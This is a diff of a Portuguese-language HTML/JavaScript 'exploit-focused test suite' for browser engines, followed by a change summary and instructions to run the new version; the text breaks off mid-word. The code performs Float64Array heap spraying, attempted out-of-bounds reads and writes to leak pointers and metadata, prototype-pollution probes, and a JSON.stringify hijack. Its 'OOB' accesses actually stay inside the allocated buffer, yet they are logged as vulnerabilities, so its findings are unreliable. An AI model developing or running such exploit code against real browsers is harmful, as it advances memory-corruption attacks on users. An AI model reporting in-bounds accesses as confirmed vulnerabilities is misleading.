@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Suite de Testes Focada em Exploit (v19.1)</title>
+    <title>Suite de Testes Focada em Exploit (v19.2)</title>
     <style>
         body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 14px; }
         #output {
@@ -43,15 +43,15 @@
     </style>
 </head>
 <body>
-    <h1>Suite de Testes Focada em Exploit (v19.1)</h1>
-    <p>Foco: OOB Read/Leak (c/ Spray), OOB Write (Metadata), PP Avançada/Gadgets, Hijack+OOB Interaction.</p>
-    <button id="runBtn" onclick="runExploitFocusedTests()">Iniciar Testes Focados (v19.1)</button>
+    <h1>Suite de Testes Focada em Exploit (v19.2)</h1>
+    <p>Foco: OOB Read/Leak (c/ Float64 Spray), OOB Write (Metadata), PP Avançada/Gadgets, Hijack+OOB Interaction.</p>
+    <button id="runBtn" onclick="runExploitFocusedTests()">Iniciar Testes Focados (v19.2)</button>
     <div id="output"></div>
     <hr>
     <div id="summary"></div>
 
     <script>
-        // --- Script Focado em Exploit (v19.1) ---
+        // --- Script Focado em Exploit (v19.2) ---
         const outputDiv = document.getElementById('output');
         const runBtn = document.getElementById('runBtn');
         const SHORT_PAUSE = 50;
@@ -79,23 +79,23 @@
         // Funções Helper (v19.0)
         const PAUSE = (ms = SHORT_PAUSE) => new Promise(r => setTimeout(r, ms));
         const toHex = (val, bits = 32) => { if (typeof val !== 'number' || !isFinite(val)) return 'NaN/Invalid'; let num = Number(val); if (bits <= 32) { num = num >>> 0; } const pad = Math.ceil(bits / 4); return '0x' + num.toString(16).toUpperCase().padStart(pad, '0'); };
-        const isPotentialPointer64 = (high, low) => { if (high === null || low === null || typeof high !== 'number' || typeof low !== 'number') return false; if (high === 0 && low === 0) return false; const high_u = high >>> 0; const low_u = low >>> 0; if (high_u === 0xFFFFFFFF && low_u === 0xFFFFFFFF) return false; if (high_u === 0xAAAAAAAA && low_u === 0xAAAAAAAA) return false; if (high === 0 && low < 0x100000) return false; return true; };
+        const isPotentialPointer64 = (high, low) => { if (high === null || low === null || typeof high !== 'number' || typeof low !== 'number') return false; if (high === 0 && low === 0) return false; const high_u = high >>> 0; const low_u = low >>> 0; if (high_u === 0xFFFFFFFF && low_u === 0xFFFFFFFF) return false; if (high_u === 0xAAAAAAAA && low_u === 0xAAAAAAAA) return false; if (high_u === 0xAAAAAAEE && low_u === 0xAAAAAAAA) return false; if (high_u === 0xAAAAAAAA && low_u === 0xAAAAAAEE) return false; if (high === 0 && low < 0x100000) return false; return true; };
         const isPotentialData32 = (val) => { if (val === null || typeof val !== 'number') return false; val = val >>> 0; if (val === 0 || val === 0xFFFFFFFF || val === 0xAAAAAAAA || val === 0xAAAAAAEE) return false; if (val < 0x1000) return false; return true; };
 
-        // --- Testes Prioritários (v19.1 - OOB Read com Spray) ---
+        // --- Testes Prioritários (v19.2 - OOB Read com Float64 Spray) ---
 
-        // 1. Teste de Leitura OOB / Vazamento de Info (v19.1 com Spray)
+        // 1. Teste de Leitura OOB / Vazamento de Info (v19.2 com Float64 Spray)
         const testOOBReadInfoLeak = async () => {
             const FNAME = 'testOOBReadInfoLeak';
-            log("--- Iniciando Teste 1: OOB Write/Read (Leak c/ Spray) ---", 'test', FNAME);
-            // Parâmetros ligeiramente ajustados
-            const bufferSize = 48; // Aumentado
+            log("--- Iniciando Teste 1: OOB Write/Read (Leak c/ Float64 Spray) ---", 'test', FNAME);
+            const bufferSize = 64; // Tamanho do buffer de controle
             const writeValue = 0xEE; const oobWriteOffset = bufferSize;
-            const readRangeStart = -80; const readRangeEnd = bufferSize + 80; // Faixa de leitura um pouco maior
-            const allocationSize = bufferSize + 384; // Aumentado significativamente
-            const baseOffsetInBuffer = 192; // Ajustado
-            const sprayCount = 200; // Número de objetos para spray
-            const sprayedObjects = [];
+            const readRangeStart = -96; const readRangeEnd = bufferSize + 96; // Faixa de leitura
+            const allocationSize = bufferSize + 256; // Tamanho do buffer de controle
+            const baseOffsetInBuffer = 128; // Onde o buffer "começa" na alocação
+            const sprayCount = 300; // Número de Float64Arrays para spray
+            const floatArraySize = 8; // Tamanho de cada Float64Array (em elementos double)
+            const sprayedFloatArrays = [];
 
             const oobReadOffsets = [];
             for (let i = readRangeStart; i < readRangeEnd; i += 4) { oobReadOffsets.push(i); }
@@ -103,28 +103,36 @@
             leakedValueFromOOB = null; // Resetar leak global
 
             try {
-                // --- v19.1: Object Spray ---
-                log(`Realizando spray de ${sprayCount} objetos...`, 'info', FNAME);
+                // --- v19.2: Float64Array Spray ---
+                log(`Realizando spray de ${sprayCount} Float64Arrays (tamanho ${floatArraySize})...`, 'info', FNAME);
                 for (let i = 0; i < sprayCount; i++) {
-                    sprayedObjects.push({
-                        marker: 0x41414141 + i, // Valor reconhecível
-                        padding: 0x42424242 // Outro valor
-                    });
+                    try {
+                        // Criar um ArrayBuffer pequeno para cada Float64Array
+                        const faBuffer = new ArrayBuffer(floatArraySize * 8); // 8 bytes por double
+                        const fa = new Float64Array(faBuffer);
+                        // Preencher com um valor reconhecível (o índice como double)
+                        fa[0] = i; // Armazena o índice como double
+                        for(let k = 1; k < floatArraySize; k++) { fa[k] = 0.5 + i; } // Outros valores
+                        sprayedFloatArrays.push(fa); // Manter referência
+                    } catch (e) {
+                        log(`Erro ao criar Float64Array ${i} no spray: ${e.message}`, 'warn', FNAME);
+                        break; // Parar spray se houver erro
+                    }
                 }
-                log(`Spray concluído.`, 'info', FNAME);
-                await PAUSE(SHORT_PAUSE); // Pausa após spray
+                log(`Spray concluído (${sprayedFloatArrays.length} arrays criados).`, 'info', FNAME);
+                await PAUSE(SHORT_PAUSE);
 
                 // --- Alocação do buffer de controle ---
                 const buffer = new ArrayBuffer(allocationSize);
                 const dataView = new DataView(buffer);
-                for (let i = 0; i < buffer.byteLength; i++) { dataView.setUint8(i, 0xAA); } // Preencher
+                for (let i = 0; i < buffer.byteLength; i++) { dataView.setUint8(i, 0xBB); } // Usar padrão diferente (BB)
 
                 const writeTargetAddress = baseOffsetInBuffer + oobWriteOffset;
                 await PAUSE();
 
                 // Tentar escrita OOB simples
                 try {
-                    dataView.setUint8(writeTargetAddress, writeValue);
+                    dataView.setUint8(writeTargetAddress, writeValue); // Escrever EE sobre BB
                     log(`VULN: Escrita OOB U8 @${oobWriteOffset} (addr ${writeTargetAddress}) OK! Val=${toHex(writeValue, 8)}`, 'vuln', FNAME);
                     log(`---> *** ALERTA: Primitivo Relevante (OOB Write Simples) ***`, 'escalation', FNAME);
                     writeSuccess = true;
@@ -138,6 +146,7 @@
 
                 // Tentar leitura OOB para vazar informação
                 log(`Tentando leitura OOB na faixa [${readRangeStart}, ${readRangeEnd})...`, 'info', FNAME);
+                const tempReadView = new DataView(new ArrayBuffer(8)); // Para ler Float64
                 for (const readOffset of oobReadOffsets) {
                     const readTargetAddress = baseOffsetInBuffer + readOffset;
                     const relOffsetStr = `@${readOffset} (addr ${readTargetAddress})`;
@@ -147,46 +156,60 @@
                         try {
                             const low = dataView.getUint32(readTargetAddress, true);
                             const high = dataView.getUint32(readTargetAddress + 4, true);
-                            // Checar se não é o padrão de preenchimento AA ou o padrão do spray (improvável em 64 bits)
-                            if (!((high === 0xAAAAAAAA && low === 0xAAAAAAAA))) {
-                                if (isPotentialPointer64(high, low)) {
-                                    const vStr = `H=${toHex(high)} L=${toHex(low)}`;
-                                    log(` -> PTR? U64 ${relOffsetStr}: ${vStr}`, 'ptr', FNAME);
-                                    potentialLeakFoundCount++;
-                                    if (leakedValueFromOOB === null) {
-                                        leakedValueFromOOB = { high, low, type: 'U64', offset: readOffset };
-                                        log(` -> VALOR U64 ARMAZENADO ${relOffsetStr}: H=${toHex(high)}, L=${toHex(low)}.`, 'vuln', FNAME);
-                                        log(` ---> *** ALERTA: Primitivo Relevante (OOB Read Pointer Leak) ***`, 'escalation', FNAME);
-                                    }
-                                } else if (high === 0x41414141 || low === 0x41414141 || high === 0x42424242 || low === 0x42424242) {
-                                     // v19.1: Checa se leu parte de um objeto do spray
-                                     log(` -> Objeto Spray? U64 ${relOffsetStr}: H=${toHex(high)} L=${toHex(low)}`, 'leak', FNAME);
-                                     potentialLeakFoundCount++;
+
+                            // Ignorar padrão de preenchimento BB
+                            if (high === 0xBBBBBBBB && low === 0xBBBBBBBB) continue;
+
+                            // Interpretar como double para checar padrão do spray
+                            tempReadView.setUint32(0, low, true);
+                            tempReadView.setUint32(4, high, true);
+                            const doubleVal = tempReadView.getFloat64(0, true);
+
+                            // Checar se é o índice do spray (valor double)
+                            if (doubleVal >= 0 && doubleVal < sprayCount && Math.floor(doubleVal) === doubleVal) {
+                                log(` -> Spray Double? ${doubleVal.toFixed(1)} ${relOffsetStr}: H=${toHex(high)} L=${toHex(low)}`, 'leak', FNAME);
+                                potentialLeakFoundCount++;
+                                if (leakedValueFromOOB === null) {
+                                     leakedValueFromOOB = { high, low, type: 'F64_SPRAY', offset: readOffset };
+                                     log(` -> VALOR SPRAY F64 ARMAZENADO ${relOffsetStr}.`, 'vuln', FNAME);
                                 }
                             }
+                            // Checar se é ponteiro (e não o double do spray)
+                            else if (isPotentialPointer64(high, low)) {
+                                const vStr = `H=${toHex(high)} L=${toHex(low)}`;
+                                log(` -> PTR? U64 ${relOffsetStr}: ${vStr}`, 'ptr', FNAME);
+                                potentialLeakFoundCount++;
+                                if (leakedValueFromOOB === null) {
+                                    leakedValueFromOOB = { high, low, type: 'U64', offset: readOffset };
+                                    log(` -> VALOR U64 ARMAZENADO ${relOffsetStr}: H=${toHex(high)}, L=${toHex(low)}.`, 'vuln', FNAME);
+                                    log(` ---> *** ALERTA: Primitivo Relevante (OOB Read Pointer Leak) ***`, 'escalation', FNAME);
+                                }
+                            }
+                            // v19.2: Checar por valores que podem ser tamanho/ponteiro do buffer interno (heurístico)
+                            // Ex: Se low for um múltiplo de 8 pequeno (tamanho do buffer) e high for um ponteiro
+                            else if (low === floatArraySize * 8 && isPotentialPointer64(high, 0)) {
+                                log(` -> FloatArray Meta? (size=${low}) ${relOffsetStr}: H=${toHex(high)} L=${toHex(low)}`, 'leak', FNAME);
+                                potentialLeakFoundCount++;
+                            }
+
                         } catch (e) {}
                     }
 
-                    // Tentar ler como U32
+                    // Tentar ler como U32 (menos provável vazar ponteiro aqui, mas checar dados)
                     if (leakedValueFromOOB === null && readTargetAddress >= 0 && readTargetAddress + 4 <= buffer.byteLength) {
                         try {
                             const val32 = dataView.getUint32(readTargetAddress, true);
-                             // Checar se não é o padrão de preenchimento AA
-                            if (val32 !== 0xAAAAAAAA) {
+                            // Ignorar padrão BB
+                            if (val32 !== 0xBBBBBBBB) {
                                 if (isPotentialData32(val32)) {
-                                     // v19.1: Checa se leu parte de um objeto do spray
-                                    if (val32 >= 0x41414141 && val32 < (0x41414141 + sprayCount) || val32 === 0x42424242) {
-                                         log(` -> Objeto Spray? U32 ${relOffsetStr}: ${toHex(val32)}`, 'leak', FNAME);
-                                    } else {
-                                         log(` -> Leak U32? ${relOffsetStr}: ${toHex(val32)}`, 'leak', FNAME);
-                                    }
+                                    log(` -> Leak U32? ${relOffsetStr}: ${toHex(val32)}`, 'leak', FNAME);
                                     potentialLeakFoundCount++;
                                     leakedValueFromOOB = { high: 0, low: val32, type: 'U32', offset: readOffset };
                                     log(` -> VALOR U32 ARMAZENADO ${relOffsetStr}: ${toHex(val32)}.`, 'vuln', FNAME);
                                     log(` ---> *** ALERTA: Potencial Vazamento Info OOB Read U32 ***`, 'escalation', FNAME);
                                 }
                                 // Checar se leu o valor escrito OOB
-                                if (readOffset === oobWriteOffset && val32 === (writeValue | (0xAA << 8) | (0xAA << 16) | (0xAA << 24))) {
+                                if (readOffset === oobWriteOffset && val32 === (writeValue | (0xBB << 8) | (0xBB << 16) | (0xBB << 24))) {
                                     log(` -> Leu valor OOB escrito (${toHex(val32)}) ${relOffsetStr}! Confirma R/W.`, 'vuln', FNAME);
                                 }
                             }
@@ -198,8 +221,7 @@
                 log(`Erro fatal no Teste 1: ${e.message}`, 'error', FNAME);
                 console.error(e);
             } finally {
-                // Limpar spray (ajuda GC, mas não essencial para o teste)
-                sprayedObjects.length = 0;
+                sprayedFloatArrays.length = 0; // Limpar spray
                 const leakStatus = leakedValueFromOOB
                     ? `1 valor ${leakedValueFromOOB.type} @${leakedValueFromOOB.offset} (H=${toHex(leakedValueFromOOB.high)}, L=${toHex(leakedValueFromOOB.low)})`
                     : 'nenhum valor armazenado';
@@ -262,19 +284,19 @@
             const FNAME = 'testPPJsonHijackInteraction';
             log("--- Teste 4: PP Hijack (JSON.stringify) + OOB Interaction ---", 'test', FNAME);
             const orig = JSON.stringify; let okH = false; let okL = false; let okR = false;
-            try { JSON.stringify = function hijacked(v, r, s) { log("===> VULN: JSON.stringify SEQUESTRADO! <===", 'vuln', FNAME); okH = true; try { const l = leakedValueFromOOB; let lStr = "NULO ou Indefinido"; let lHex = ""; if (l) { lHex = ` (H=${toHex(l.high)}, L=${toHex(l.low)})`; lStr = l.type === 'U64' ? `U64 H=${toHex(l.high)} L=${toHex(l.low)} @${l.offset}` : `U32 ${toHex(l.low)} @${l.offset}`; okL = true; log(` ---> INFO: Interação Hijack + OOB Read Leak OK.`, 'escalation', FNAME); } log(` -> Valor OOB lido via Hijack: ${lStr}${lHex}`, okL ? 'leak' : 'warn', FNAME); } catch(ie) { log(` -> Erro ao tentar ler leak OOB via Hijack: ${ie.message}`, 'error', FNAME); console.error(ie); } const hijackReturnValue = '{"hijacked": true, "leak_read_success": ' + okL + '}'; return hijackReturnValue; }; await PAUSE(); const testObject = {a:1, b: 'test'}; const result = JSON.stringify(testObject); if (result && result.includes('"hijacked": true')) { log("VULN: Retorno da função JSON.stringify sequestrada verificado!", 'vuln', FNAME); okR = true; } else if (okH) { log("AVISO: JSON.stringify sequestrado, mas retorno inesperado.", 'warn', FNAME); } else { log("JSON.stringify não foi sequestrado.", 'good', FNAME); } } catch (e) { log(`Erro fatal durante Teste 4: ${e.message}`, 'error', FNAME); console.error(e); } finally { const currentStringify = JSON.stringify; JSON.stringify = orig; if (currentStringify !== orig && JSON.stringify !== orig) { log("ERRO CRÍTICO: FALHA ao restaurar JSON.stringify!", 'critical', FNAME); } else if (okH) { log("JSON.stringify restaurado.", 'good', 'Cleanup');} }
+            try { JSON.stringify = function hijacked(v, r, s) { log("===> VULN: JSON.stringify SEQUESTRADO! <===", 'vuln', FNAME); okH = true; try { const l = leakedValueFromOOB; let lStr = "NULO ou Indefinido"; let lHex = ""; if (l) { lHex = ` (H=${toHex(l.high)}, L=${toHex(l.low)})`; lStr = l.type === 'U64' ? `U64 H=${toHex(l.high)} L=${toHex(l.low)} @${l.offset}` : l.type === 'F64_SPRAY' ? `F64_SPRAY H=${toHex(l.high)} L=${toHex(l.low)} @${l.offset}` : `U32 ${toHex(l.low)} @${l.offset}`; okL = true; log(` ---> INFO: Interação Hijack + OOB Read Leak OK.`, 'escalation', FNAME); } log(` -> Valor OOB lido via Hijack: ${lStr}${lHex}`, okL ? 'leak' : 'warn', FNAME); } catch(ie) { log(` -> Erro ao tentar ler leak OOB via Hijack: ${ie.message}`, 'error', FNAME); console.error(ie); } const hijackReturnValue = '{"hijacked": true, "leak_read_success": ' + okL + '}'; return hijackReturnValue; }; await PAUSE(); const testObject = {a:1, b: 'test'}; const result = JSON.stringify(testObject); if (result && result.includes('"hijacked": true')) { log("VULN: Retorno da função JSON.stringify sequestrada verificado!", 'vuln', FNAME); okR = true; } else if (okH) { log("AVISO: JSON.stringify sequestrado, mas retorno inesperado.", 'warn', FNAME); } else { log("JSON.stringify não foi sequestrado.", 'good', FNAME); } } catch (e) { log(`Erro fatal durante Teste 4: ${e.message}`, 'error', FNAME); console.error(e); } finally { const currentStringify = JSON.stringify; JSON.stringify = orig; if (currentStringify !== orig && JSON.stringify !== orig) { log("ERRO CRÍTICO: FALHA ao restaurar JSON.stringify!", 'critical', FNAME); } else if (okH) { log("JSON.stringify restaurado.", 'good', 'Cleanup');} }
             log(`--- Teste 4 Concluído (Hijack: ${okH}, Retorno: ${okR}, Leitura Leak: ${okL}) ---`, 'test', FNAME);
             return okR && okL;
         };
 
-        // --- Função Principal de Execução (v19.1) ---
+        // --- Função Principal de Execução (v19.2) ---
         const runExploitFocusedTests = async () => {
             const FNAME = 'runExploitFocusedTests';
             if (runBtn) runBtn.disabled = true; findings = [];
             const summaryDiv = document.getElementById('summary');
             if (summaryDiv) summaryDiv.innerHTML = ''; if (outputDiv) outputDiv.innerHTML = '';
-            log("==== INICIANDO TESTES FOCADOS EM EXPLOIT (v19.1) ====", 'test', FNAME);
-            await testOOBReadInfoLeak(); // v19.1 com spray
+            log("==== INICIANDO TESTES FOCADOS EM EXPLOIT (v19.2) ====", 'test', FNAME);
+            await testOOBReadInfoLeak(); // v19.2 com Float64 spray
             await PAUSE(MEDIUM_PAUSE);
             await testOOBWriteMetadata();
             await PAUSE(MEDIUM_PAUSE);
@@ -287,7 +309,7 @@
                 summaryDiv.innerHTML = '<h2>Sumário Testes Focados (Findings Críticos)</h2>';
                 if (findings.length === 0) { summaryDiv.innerHTML += '<p style="color:#4CAF50;">Nenhum finding crítico/relevante (vuln, critical, escalation, ptr, leak) registrado.</p>'; } else { summaryDiv.innerHTML += `<p style="color:#FFC107;">${findings.length} finding(s) crítico(s)/relevante(s) registrado(s):</p><ul>`; findings.sort((a, b) => { const order = { 'escalation': 1, 'critical': 2, 'vuln': 3, 'ptr': 4, 'leak': 5 }; return (order[a.type] || 99) - (order[b.type] || 99); }); findings.forEach(f => { const itemClass = f.type === 'critical' ? 'log-critical' : f.type === 'escalation' ? 'log-escalation' : f.type === 'ptr' ? 'log-ptr' : f.type === 'leak' ? 'log-leak' : 'log-vuln'; const cleanMessage = f.message.replace(/</g, "&lt;").replace(/>/g, "&gt;"); summaryDiv.innerHTML += `<li class="${itemClass}">${f.time} [${f.funcName}] ${cleanMessage}</li>`; }); summaryDiv.innerHTML += '</ul>'; }
             }
-            log("\n==== TESTES FOCADOS CONCLUÍDOS (v19.1) ====", 'test', FNAME);
+            log("\n==== TESTES FOCADOS CONCLUÍDOS (v19.2) ====", 'test', FNAME);
             if (runBtn) runBtn.disabled = false;
         };
     </script>
@@ -296,14 +318,24 @@
 </html>
 ```
 
-**Resumo das Mudanças (v19.1):**
+**Resumo das Mudanças (v19.2):**
 
-1.  **`testOOBReadInfoLeak` Modificado:**
-    * Ajustados `bufferSize`, `allocationSize`, `baseOffsetInBuffer` e a faixa de leitura (`readRangeStart`, `readRangeEnd`).
-    * Adicionado um loop que cria `sprayCount` (200) objetos simples (`{marker: ..., padding: ...}`) e os armazena em `sprayedObjects` antes de alocar o buffer de controle.
-    * A lógica de leitura OOB agora também verifica se os valores lidos (U64 ou U32) correspondem aos padrões `0x41414141` ou `0x42424242`, logando como `Objeto Spray?` se encontrar.
-    * Ignora a leitura de padrões de preenchimento `0xAAAAAAAA`.
-2.  **Outros Testes:** `testOOBWriteMetadata`, `testAdvancedPP`, e `testPPJsonHijackInteraction` permanecem como na v19.0.
-3.  **Versionamento:** Atualizado para v19.1.
+1.  **`testOOBReadInfoLeak` Refeito:**
+    * Utiliza `sprayedFloatArrays` para armazenar `Float64Array`s, cada um com seu próprio `ArrayBuffer` e contendo seu índice `i` como valor `double`.
+    * Usa `0xBB` como padrão de preenchimento do buffer de controle para diferenciar do `0xAA` anterior.
+    * A lógica de leitura OOB agora:
+        * Ignora o padrão `0xBBBBBBBBBBBBBBBB`.
+        * Tenta interpretar 64 bits lidos como `double` e verifica se corresponde a um índice `i` do spray.
+        * Continua verificando se o valor lido parece um ponteiro de 64 bits (`isPotentialPointer64`).
+        * Adiciona uma verificação heurística para metadados de `Float64Array` (se `low` for o tamanho esperado e `high` parecer um ponteiro).
+        * A verificação de U32 agora ignora `0xBBBBBBBB` e procura por dados gerais ou se leu o valor `0xEE` escrito.
+2.  **Outros Testes:** Mantidos como na v19.0/v19.1.
+3.  **Versionamento:** Atualizado para v19.2.
 
-Teste esta nova versão. O objetivo é ver se a combinação do spray de objetos e os ajustes nos parâmetros de alocação/leitura resultam em um `leakedValueFromOOB` que **não** seja `0xAAAAAAAA AAAAAAAA`, ou se aparecem logs `Objeto Spray?` indicando que a leitura OOB atingiu a memória desses objetos. Boa sor
+Execute esta versão e observe atentamente os logs do `testOOBReadInfoLeak`. Procure por:
+
+* Logs `VALOR U64 ARMAZENADO` ou `VALOR U32 ARMAZENADO` com valores que **não** sejam `0xAAAA...` ou `0xBBBB...`.
+* Logs `Spray Double?` indicando que a leitura atingiu o conteúdo de um `Float64Array`.
+* Logs `FloatArray Meta?` indicando uma possível leitura de metadados.
+
+Qualquer um desses seria um sinal promissor de um vazamento de informação mais út
